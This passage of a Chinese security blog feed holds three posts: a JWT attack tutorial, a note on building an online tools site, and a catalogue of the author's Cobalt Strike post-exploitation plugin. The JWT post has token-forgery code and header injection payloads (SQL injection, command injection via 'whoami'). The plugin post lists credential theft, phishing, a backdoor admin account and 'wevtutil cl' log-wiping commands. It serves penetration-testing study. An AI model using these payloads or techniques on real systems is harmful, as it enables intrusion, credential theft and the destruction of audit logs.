class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> b64urlencode(<span class="string">&quot;&#123;\&quot;typ\&quot;:\&quot;JWT\&quot;,\&quot;alg\&quot;:\&quot;none\&quot;&#125;&quot;</span>) + \</span><br><span class="line">    <span class="string">&#x27;.&#x27;</span> + b64urlencode(<span class="string">&quot;&#123;\&quot;data\&quot;:\&quot;test\&quot;&#125;&quot;</span>) + <span class="string">&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure><p>传入后结果如下，通过验证：</p><p><img src="https://oss.zjun.info/zjun.info/20210215000306.png" alt="alg=none"></p><h4 id="将alg由RS256更改为HS256"><a href="#将alg由RS256更改为HS256" class="headerlink" title="将alg由RS256更改为HS256"></a>将alg由RS256更改为HS256</h4><p>HS256算法使用密钥来为每个消息进行签名和验证。RS256算法使用私钥对消息进行签名，并使用公钥进行验证。如果我们将算法从RS256更改为HS256，则将使用公钥作为私钥使用HS256算法验证签名，则后端代码使用RSA公钥+HS256算法进行签名验证。由于公钥是公开的，因此我们可以正确签署这类消息。</p><p>相同，我们也可以使用演示实例：<a href="https://github.com/Sjord/jwtdemo">https://github.com/Sjord/jwtdemo</a></p><p>RS256演示页面：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a></p><p>RSA公钥：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a></p><p>Exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment"># eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9</span></span><br><span class="line"><span class="comment"># &#123;&quot;typ&quot;: &quot;JWT&quot;,&quot;alg&quot;: &quot;RS256&quot;&#125;</span></span><br><span class="line"><span class="comment"># eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxMzM1OTA5NiwiZXhwIjoxNjEzMzYwMjk2LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># &#123;&quot;iss&quot;: &quot;http://demo.sjoerdlangkemper.nl/&quot;,&quot;iat&quot;: 1613359096,&quot;exp&quot;: 1613360296,&quot;data&quot;: &#123;&quot;hello&quot;: &quot;world&quot;&#125;&#125;</span></span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;public.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span> jwt.encode(&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;, key=public, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure><p>理论可行，但是实际未成功，可能是公钥处理的问题。</p><h3 id="无效签名"><a href="#无效签名" class="headerlink" title="无效签名"></a>无效签名</h3><p>当用户端提交请求给应用程序，服务端可能没有对签名部分进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制，当然这种情况极少。</p><p>下面一段JWT：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCIsImFjdGlvbiI6InByb2ZpbGUifQ.FjnAvQxzRKcahlw2EPd9o7teqX-fQSt7MZhT84hj7mU</span><br></pre></td></tr></table></figure><p>payload部分为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;profile&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若存在无效签名的话，即直接修改user字段，便可伪造其他用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJhY3Rpb24iOiJwcm9maWxlIn0._LRRXAfXtnagdyB1uRk-7CfkK1RESGwxqQCdwCNSPaI</span><br></pre></td></tr></table></figure><h3 id="爆破签名密钥"><a href="#爆破签名密钥" class="headerlink" title="爆破签名密钥"></a>爆破签名密钥</h3><p>针对于HS256对称加密算法，如果HS256密钥的强度较弱的话，攻击者可以直接通过暴力破解的攻击方式来得到密钥。具体方法很简单：如果密钥正确的话，解密就会成功；如果密钥错误的话，解密代码就会抛出异常。</p><p>例如CISCN2019 华北赛区 Day1 Web2 ikun一题中就有利用爆破JWT密钥进行伪造token。</p><p>解题过程见：<a href="https://blog.zjun.info/2019/ikun.html">https://blog.zjun.info/2019/ikun.html</a></p><p>爆破工具：<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>、<a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a>或<a href="https://github.com/Ch1ngg/JWTPyCrack">JWTPyCrack</a></p><p>在线JWT加解密网站：<a href="https://jwt.io/">https://jwt.io/</a></p><h3 id="密钥泄露"><a href="#密钥泄露" class="headerlink" title="密钥泄露"></a>密钥泄露</h3><p>假设攻击者无法暴力破解密钥，那么他可能通过其他途径获取密钥，如git信息泄露、目录遍历，任意文件读取、XXE漏洞等，从而伪造任意token签名。</p><h3 id="可控头部参数"><a href="#可控头部参数" class="headerlink" title="可控头部参数"></a>可控头部参数</h3><h4 id="KID头部参数"><a href="#KID头部参数" class="headerlink" title="KID头部参数"></a>KID头部参数</h4><p>KID代表”密钥ID”即”Key ID”。它是JWT中的可选头部字段，它使开发人员可以指定用于验证token的密钥。KID参数的正确用法如下所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;：&quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;：&quot;JWT&quot;,</span><br><span class="line">  &quot;kid&quot;：&quot;1&quot;//使用密钥1来验证令牌</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于此字段是由用户控制的，因此攻击者可能会操纵它并导致危险的后果。</p><h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h5><p>由于KID通常用于从文件系统中检索密钥文件，因此，如果在使用前未对其进行清理，则可能导致目录遍历攻击。在这种情况下，攻击者将能够在文件系统中指定任何文件作为用于验证令牌的密钥。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;kid&quot;: &quot;../../public/css/main.css&quot;</span><br><span class="line"><span class="comment">//使用公共文件main.css验证token</span></span><br></pre></td></tr></table></figure><p>例如，攻击者可以迫使应用程序使用公开可用的文件作为密钥，并使用该文件对HMAC令牌进行签名。</p><h5 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h5><p>KID还可以用于从数据库检索密钥。在这种情况下，可能可以利用SQL注入来绕过JWT签名。如果可以在KID参数上进行SQL注入，则攻击者可以使用该注入返回她想要的任何值。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;kid&quot;:&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;--&quot;</span><br><span class="line"><span class="comment">//使用字符串&quot;key&quot;验证token</span></span><br></pre></td></tr></table></figure><p>例如，上面的注入将使应用程序返回字符串”key”（因为数据库中不存在名为”aaaaaaa”的键）。然后将使用字符串”key”作为密钥来验证令牌。</p><h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h5><p>有时，当KID参数直接传递到不安全的文件读取操作中时，可以将命令注入代码流中。</p><p>可能允许这种类型的攻击的函数之一是<code>Ruby open()</code>函数。此功能使攻击者只需在KID文件名之后将命令添加到输入即可，即可执行系统命令：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;key_file&quot; | whoami;</span><br></pre></td></tr></table></figure><p>这只是一个例子。从理论上讲，每当应用程序将未经过滤审查的任何头文件参数传递给类似于<code>system()</code>，<code>exec()</code>等的任何函数时，就会发生此类漏洞。</p><h4 id="JKU头部参数"><a href="#JKU头部参数" class="headerlink" title="JKU头部参数"></a>JKU头部参数</h4><p>JWKSet URL即JKU。它是一个可选的头部字段，用于指定指向一组用于验证token密钥的URL。如果允许该字段，并且没有适当地限制此字段，则攻击者可以托管自己的密钥文件，并指定应用程序使用它来验证token。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jku URL-&gt;包含JWK集的文件-&gt;用于验证token的JWK</span><br></pre></td></tr></table></figure><h4 id="JWK头部参数"><a href="#JWK头部参数" class="headerlink" title="JWK头部参数"></a>JWK头部参数</h4><p>可选的JWK（JSON Web Key）标头参数允许攻击者将用于验证token的密钥直接嵌入token中。</p><h4 id="X5U、X5C-URL操作"><a href="#X5U、X5C-URL操作" class="headerlink" title="X5U、X5C URL操作"></a>X5U、X5C URL操作</h4><p>类似于JKU和JWK头部参数，X5U和X5C标头参数允许攻击者指定用于验证token的公钥证书或证书链。X5U以URI形式指定信息，而X5C允许将证书值嵌入token中。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://jwt.io/introduction/">https://jwt.io/introduction/</a></p></li><li><p><a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a></p></li><li><p><a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></p></li><li><p><a href="https://en.wikipedia.org/wiki/JSON_Web_Token">https://en.wikipedia.org/wiki/JSON_Web_Token</a></p></li><li><p><a href="https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a">https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> CTF </tag>
            
            <tag> JWT </tag>
            
            <tag> Token攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于在线工具站点</title>
      <link href="2021/about-the-online-tools-site.html"/>
      <url>2021/about-the-online-tools-site.html</url>
      
        <content type="html"><![CDATA[<p>一个一时的想法，想做一个集在线工具，博客等一体的网站。由于强迫症原因，执意把博客换成了blog二级域名。虽然这对网站seo来说极为不利，这里就来聊聊关于这些的想法。</p><a id="more"></a><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>大概就是这个月中旬，一时的想法，突然感觉有一个自己的在线工具网站还挺酷的，于是就开始想着具体要放一些什么功能进去。比如啊：编码转换、shellcode免杀、子域爆破、杀软识别、辅助提权等等，虽然网上现成的网站也很多，全当没事做造轮子。</p><h2 id="网站改版"><a href="#网站改版" class="headerlink" title="网站改版"></a>网站改版</h2><p>当有造轮子的想法开始，想着把工具站放在tools二级域名下，博客呢就放在blog二级域名下，和谐统一。</p><p>百度站长工具有一项网站改版，提交规则后可以直接把百度原收录的链接改为改版后的链接。这个功能就方便了我这样的情况。</p><p><img src="https://oss.zjun.info/zjun.info/20210128204158.png" alt="网站改版"></p><p>需要新旧链接301跳转，这可把我难住了。hexo我是部署在coding上的，静态网站怎么设置301跳转呢？如果是Apache或者IIS这些中间件就方便了，301改个配置文件的事。</p><h3 id="html跳转"><a href="#html跳转" class="headerlink" title="html跳转"></a>html跳转</h3><p>网上看见有博主直接在对应页面中加入html跳转代码，而且我还找到了一个可以在线生成301跳转的网站<a href="http://www.soupan.info/tool/301.php">http://www.soupan.info/tool/301.php</a> ，生成的html与js跳转代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;0; url=https://blog.zjun.info&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span>&gt;</span><br><span class="line">  top.location=<span class="string">&#x27;https://blog.zjun.info&#x27;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>当然网站改版需要的是每一个页面的一一对应，所以可以写个脚本批量替换，或者引用js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=javascript&gt; </span><br><span class="line"> <span class="keyword">if</span> (<span class="built_in">document</span>.domain ==<span class="string">&#x27;www.zjun.info&#x27;</span>)  </span><br><span class="line">     <span class="built_in">this</span>.location = <span class="string">&quot;https://blog.zjun.info&quot;</span> + <span class="built_in">this</span>.location.pathname + <span class="built_in">this</span>.location.search; </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>实际测试中也发现是200跳转，并不是301，肯定不满足百度的网站改版要求。</p><p><img src="https://oss.zjun.info/zjun.info/20210128210146.png" alt="200跳转"></p><p>比较神奇的现象就是该博主的网站改版成功了，我反复研读多遍，确认不曾遗漏关键步骤，于是死马当活马医，就这样添加了html跳转代码后用两个域名同时部署在两个coding服务上，提交百度网站改版。不出所料，不成功。可能是coding的原因抑或是我个人的原因，甚至是百度爬虫的规则变了？</p><h3 id="阿里云显性URL301跳转"><a href="#阿里云显性URL301跳转" class="headerlink" title="阿里云显性URL301跳转"></a>阿里云显性URL301跳转</h3><p>随后在阿里云的域名dns解析中发现了url显性跳转可设置http 301状态码。</p><p><img src="https://oss.zjun.info/zjun.info/20210129105331.png" alt="URL显性301"></p><p>这可太棒了，不正好满足我目前所需吗，直接从dns的角度完成，理论来说应该是可以的，但是当我设置<code>www.zjun.info</code>的url显性301跳转至<code>blog.zjun.info</code>后。访问<code>www.zjun.info</code>却一直拒绝连接，几个小时后依旧如此，换个浏览器，换个设备依旧。不清楚怎么回事，提交改版后，不出所料也不行。</p><h3 id="CloudFlare-Page-Rules"><a href="#CloudFlare-Page-Rules" class="headerlink" title="CloudFlare Page Rules"></a>CloudFlare Page Rules</h3><p>最后一次尝试，在一篇博客中发现<a href="https://www.cloudflare.com/">cloudflare</a>有提供Page Rules，同样是在dns的角度上设置页面规则，可以设置为301，博主也是成功的改版了，抱着试一试的态度，将域名dns解析换到了cloudflare。</p><p><img src="https://oss.zjun.info/zjun.info/20210128213438.png" alt="Page Rules"></p><p>意外的是访问成功显示了http 301代码。兴致勃勃地又一次提交百度：</p><img src="https://oss.zjun.info/zjun.info/20210128213629.png" alt="检验失败" style="zoom:50%;" /><p>这是最后一次的提交状态，彻底崩溃了。按道理来说不应该，看来是我不配了。想过可能是CDN的缘故，但是阿里云和CloudFlare都没有用CDN，也不知道问题出在哪里（可能是带有https协议的缘故）。遂放弃网站改版，重新开始吧。</p><h2 id="Online-Tools"><a href="#Online-Tools" class="headerlink" title="Online Tools"></a>Online Tools</h2><p>这里不得不吹一下<a href="https://www.mdui.org/">MDUI</a>，极像谷歌安卓的设计语言。关键是国人开发，开发文档都是中文不说，还特别详细，上手容易。<a href="https://tools.zjun.info/">Online Tools</a>前端框架便是MDUI。</p><p>目前完成了三个功能点：编码转换、Google Hacking、Windows杀软识别。其他的功能以后空闲时间再完成吧。</p><p>子域爆破想依赖前端完成，不走后端。shellcode免杀用go还是python，目前还没确定。</p><p>最近两个月需要忙其他的事情，不会更新，更多的以后再说吧。</p><p>最后coding被腾讯收购，功能改版后，绑定域名竟然强制要求用户用腾讯CDN也太恶心了，不止一次不想用了，奈何他是免费的，白嫖真香！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="http://www.admintony.com/Hexo%E5%81%9ASEO%E4%BC%98%E5%8C%96%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91.html">http://www.admintony.com/Hexo做SEO优化遇到的坑.html</a></p></li><li><p><a href="https://www.hojun.cn/2018/08/01/ckjk2tsqt00gfagtu5u3tv4x7/">https://www.hojun.cn/2018/08/01/ckjk2tsqt00gfagtu5u3tv4x7/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Online Tools </tag>
            
            <tag> 在线工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近写的一款Cobalt Strike插件</title>
      <link href="2020/z1-aggressorscripts.html"/>
      <url>2020/z1-aggressorscripts.html</url>
      
        <content type="html"><![CDATA[<p>Cobalt Strike扩展性强，但是目前集成化插件很少，且大部分不满足个人内网渗透需求，所以有了本篇内容。本文不再更新但是github插件仓库将长期更新。</p><a id="more"></a><h2 id="Z1-AggressorScripts"><a href="#Z1-AggressorScripts" class="headerlink" title="Z1-AggressorScripts"></a><a href="https://github.com/z1un/Z1-AggressorScripts">Z1-AggressorScripts</a></h2><p>2020.11.21 更新：</p><ul><li>辅助模块的zip打包更换成uknow师傅的<a href="https://github.com/uknowsec/SharpZip">SharpZip</a>，内存加载无需上传。</li><li>权限维持模块新增创建自启动运行，包括添加注册表，添加启动文件夹，创建启动服务三种方式。</li></ul><p>2020.11.20 更新：</p><ul><li><p>内网穿透模块新增支持nps。</p></li><li><p>frp由之前的upx压缩版本换成未压缩版，upx压缩后的frp32位和nps都会在360上报毒，索性全部换成原版。但是这就项目导致体积由20几M增加到了30几M，强烈建议到<a href="https://gitee.com/z1un/Z1-AggressorScripts">gitee</a>下载发行版压缩文件。</p><p>windows-npc64位通过cs上传后运行会报错，不知道是不是我个人环境问题，所以npc只上传32位，不影响使用。</p></li></ul><p>适用于Cobalt Strike 3.x &amp; 4.x 的插件。</p><p><img src="https://oss.zjun.info/zjun.info/20201119120244.png" alt="image-20201119120243146"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol><li><a href="https://github.com/rasta-mouse/Watson">watson</a>获取可提取漏洞</li><li><a href="https://github.com/CCob/SweetPotato">sweetpotato</a></li><li>juicypotato</li><li>MS14-058</li><li>MS15-051</li><li>MS16-016</li><li>MS16-032</li><li>MS16-135</li><li>CVE-2020-0796</li><li><a href="https://github.com/FatRodzianko/SharpBypassUAC">SharpBypassUAC</a></li></ol><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol><li><p>单机常用命令</p><ul><li>systeminfo</li><li>whoami /all</li><li>ipconfig /all</li><li>查看路由表</li><li>查看arp缓存</li><li>查看用户信息</li><li>查看安装程序和版本信息</li><li>查看安装的补丁</li><li>查看运行的进程及路径</li><li>查看进程详细信息</li><li>查看服务</li><li>查看防火墙配置</li><li>查看计划任务</li><li>查看启动程序信息</li><li>查看在线用户</li><li>查看开机时间</li><li>查看powershell v5历史命令</li><li>查看最近使用的项目</li><li>查看SMB指向路径</li></ul></li><li><p>域环境常用命令</p><ul><li><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">AdFind</a><ul><li>列出域控制器名称</li><li>查询当前域中在线的计算机</li><li>查询当前域中在线的计算机(只显示名称和操作系统)</li><li>查询当前域中所有计算机</li><li>查询当前域中所有计算机(只显示名称和操作系统)</li><li>查询域内所有用户</li><li>查询所有GPO</li></ul></li><li>查询域</li><li>查看域管</li><li>查看域用户详细信息</li><li>查看当前登陆域</li><li>查看时间服务器</li><li>显示当前域的计算机列表</li><li>查看登陆本机的域管</li><li>查看所有域用户</li><li>查看域内所有用户组列表</li><li>查看主域控制器</li><li>查看域控列表</li><li>查看域控主机名</li><li>获取域信任信息</li><li>获取域密码信息</li><li>查看所有域成员计算机列表</li><li>查看域内所有计算机</li></ul></li><li><p><a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SharpChassisType">SharpChassisType</a>判断主机类型</p><p>用于判断当前机器类型（桌面计算机、笔记本等判断）。</p></li><li><p><a href="https://github.com/uknowsec/SharpNetCheck">SharpNetCheck</a>探测出网</p><p>在渗透过程中，对可以出网的机器是十分渴望的。在收集大量弱口令的情况下，一个一个去测试能不能出网太麻烦了。所以就有了这个工具，可配合如wmiexec、psexec等横向工具进行批量检测，该工具可以在dnslog中回显内网ip地址和计算机名，可实现内网中的快速定位可出网机器。</p></li><li><p><a href="https://github.com/uknowsec/SharpEventLog">SharpEventLog</a>(获取系统登录日志，快速定位运维机)</p><p>读取登录过本机的登录失败或登录成功（4624，4625）的所有计算机信息，在内网渗透中快速定位运维管理人员。</p></li><li><p><a href="https://github.com/uknowsec/SharpCheckInfo">SharpCheckInfo</a>(获取多项主机信息)</p><p>收集目标主机信息，包括最近打开文件，系统环境变量和回收站文件等等。</p></li><li><p><a href="https://github.com/uknowsec/SharpSQLDump">SharpSQLDump</a>(快速列出数据库数据)</p><p>内网渗透中快速获取数据库所有库名，表名，列名。具体判断后再去翻数据，节省时间。适用于mysql，mssql。</p></li><li><p><a href="https://github.com/FSecureLABS/SharpClipHistory">SharpClipHistory</a>(获取win10剪切板)</p><p>可用于从1809 Build版本开始读取Windows 10中用户剪贴板历史记录的内容。</p></li><li><p><a href="https://github.com/uknowsec/SharpAVKB">SharpAVKB</a>(杀软和补丁对比)</p><p>Windows杀软对比和补丁号对比。</p></li><li><p><a href="https://github.com/PwnDexter/SharpEDRChecker">SharpEDRChecker</a>(获取EDR信息)</p><p>检查正在运行的进程，进程元数据，加载到当前进程中的Dll以及每个DLL元数据，公共安装目录，已安装的服务和每个服务二进制元数据，已安装的驱动程序和每个驱动程序元数据，所有这些都存在已知的防御性产品，例如AV，EDR和日志记录工具。</p></li><li><p><a href="https://github.com/jnqpblc/SharpDir">SharpDir</a>(文件搜索)</p><p>可在本地和远程文件系统中搜索文件。</p></li><li><p><a href="https://www.voidtools.com/zh-cn/">Everything</a>(建立http服务文件搜索)</p></li></ol><h2 id="定位域管"><a href="#定位域管" class="headerlink" title="定位域管"></a>定位域管</h2><ol><li><p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon">PsLoggedon</a></p><p>微软官方工具。</p></li><li><p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">PVEFindADUser</a></p><p>可用于查找Active Directory用户的登录位置和/或查找谁在特定计算机上登录。这应该包括本地用户，通过RDP登录的用户，用于运行服务和计划任务的用户帐户。</p></li><li><p><a href="https://github.com/mubix/netview">netview</a></p><p>Netview是枚举工具。它使用（带有-d）当前域或指定的域（带有-d域）来枚举主机。如果希望指定包含主机列表的文件，也可以使用-f。您希望排除的任何主机名都可以在带有-e的列表中指定。如果要查询域组并突出显示这些用户的登录位置，请使用-g指定该组。</p></li></ol><h2 id="读取密码"><a href="#读取密码" class="headerlink" title="读取密码"></a>读取密码</h2><ol><li><p>logonpasswords</p></li><li><p>Krbtgt hash</p></li><li><p>探测wifi密码</p><ul><li><p>获取连接过的wifi</p></li><li><p>获取wifi密码</p></li><li><p><a href="https://github.com/r3nhat/SharpWifiGrabber">SharpWifiGrabber</a>(检索Wi-Fi密码)</p><p>Sharp Wifi Password Grabber以明文形式从保存在工作站上的所有WLAN配置文件中检索Wi-Fi密码。</p></li></ul></li><li><p>修改注册表dump明文密码</p><ul><li>显示明文</li><li>强制锁屏</li><li>隐藏明文</li></ul></li><li><p>提取浏览器数据及密码</p><ul><li><p><a href="https://github.com/QAX-A-Team/BrowserGhost">BrowserGhost</a>(提取浏览器密码)</p><p>奇安信出品。这是一个抓取浏览器密码的工具，后续会添加更多功能</p></li><li><p><a href="https://github.com/djhohnstein/SharpChromium">SharpChromium</a>(提取浏览器数据)</p><p>用于检索Chromium数据，例如Cookie，历史记录和保存的登录名。</p></li><li><p><a href="https://github.com/djhohnstein/SharpWeb">SharpWeb</a>(提取浏览器数据)</p><p>可从Google Chrome，Mozilla Firefox和Microsoft Internet Explorer / Edge检索保存的浏览器凭据。</p></li></ul></li><li><p>本地程序文件密码解密</p><ul><li><p><a href="https://github.com/chrismaddalena/SharpCloud">SharpCloud</a>(获取云凭证)</p><p>用于检查是否存在与AWS，Microsoft Azure和Google Compute相关的凭证文件。</p></li><li><p><a href="https://github.com/uknowsec/SharpDecryptPwd">SharpDecryptPwd</a>(from uknowsec)</p><p>对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。</p></li><li><p><a href="https://github.com/RcoIl/SharpDecryptPwd">SharpDecryptPwd</a>(from RcoIl)</p><p>该程序主要是针对已保存在 Windows 系统上的程序密码进行解密。目前支持 Navicat 系列、Xmanager 系列、TeamViewer、FileZilla 客户端、Foxmail、RealVNC 服务端、TortoiseSVN、WinSCP、Chrome 全版本。</p></li></ul></li><li><p>钓鱼密码窃取</p><ul><li><p><a href="https://github.com/bitsadmin/fakelogonscreen">FakeLogonScreen</a>(windows锁屏钓鱼)</p><p>FakeLogonScreen是用于伪造Windows登录屏幕以获取用户密码的实用程序。输入的密码已针对Active Directory或本地计算机进行了验证，以确保密码正确，然后将其显示在控制台上或保存到磁盘。</p></li><li><p><a href="https://github.com/matterpreter/OffensiveCSharp/tree/master/CredPhisher">CredPhisher</a>(认证登录框钓鱼)</p><p>使用CredUIPromptForWindowsCredentialsWinAPI函数提示当前用户提供其凭据。支持一个参数以提供将显示给用户的消息文本。</p></li></ul></li></ol><h2 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h2><ol><li><p><a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SharpWebScan">SharpWebScan</a>(探测web服务)</p><p>扫描 C段 的 Web 应用，获取 Title，可自定义多端口。外网也非常好用</p></li><li><p><a href="https://github.com/uknowsec/TailorScan">TailorScan</a>(缝合怪内网扫描器)</p><p>缝合怪内网扫描器，支持端口扫描，识别服务，获取title，扫描多网卡，ms17010扫描，icmp存活探测。</p></li><li><p><a href="https://github.com/shadow1ng/fscan">fscan</a>(一键大保健)</p><p>一款内网扫描工具，方便一键大保健。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息等。</p></li><li><p><a href="https://github.com/oksbsb/crack">crack</a>爆破</p><p>爆破工具,支持 ftp ssh smb mysql mssql postgres。</p></li><li><p><a href="https://github.com/jnqpblc/SharpSpray">SharpSpray</a>(域内密码爆破)</p></li></ol><h2 id="RDP相关"><a href="#RDP相关" class="headerlink" title="RDP相关"></a>RDP相关</h2><ol><li>查看RDP端口</li><li>探测RDP服务是否开启</li><li>开启RDP服务</li><li>关闭RDP服务</li><li>添加防火墙放行RDP规则</li></ol><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><ol><li><p>激活guest用户</p></li><li><p>添加域管用户</p></li><li><p>创建管理员用户</p></li><li><p><a href="https://github.com/lengjibo/RedTeamTools/blob/master/windows/bypass360%E5%8A%A0%E7%94%A8%E6%88%B7/README.md">add-admin</a>添加用户bypass</p><p>执行后自动添加一个账户进入管理员组。<br>帐号：hacker 密码：P@ssw0rd</p></li></ol><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><ol><li><p><a href="https://github.com/uknowsec/frpModify">frpmodify</a>无需frpc.ini落地</p><p>frp指定参数版（无需frpc.ini落地）</p></li><li><p><a href="https://github.com/ehang-io/nps">nps</a>无配置文件落地</p><p>一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发。使用参考：<a href="https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg%E3%80%82">https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg。</a></p></li><li><p><a href="https://github.com/cw1997/NATBypass">NATBypass</a>端口转发</p><p>一款lcx（htran）在golang下的实现。<br>通过主动连接具有公网IP的电脑打通隧道可实现内网穿透，让内网主机提供的服务能够借助外网主机来访问。软件实现的端口转发，透明代理，在主机限制入站规则但未限制出站规则的特定情况下可绕过防火墙。</p></li><li><p><a href="https://github.com/EddieIvan01/iox">iox</a>端口转发与socks5隧道</p><p>golang实现，端口转发和内网代理工具，功能类似于lcx/ew，但是比它们更好。</p></li></ol><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><ol><li>Skeleton Key</li><li>白银票据</li><li>黄金票据</li></ol><h2 id="日志清除"><a href="#日志清除" class="headerlink" title="日志清除"></a>日志清除</h2><p>清除系统日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl security</span><br><span class="line">wevtutil cl system</span><br><span class="line">wevtutil cl application</span><br><span class="line">wevtutil cl <span class="string">&quot;windows 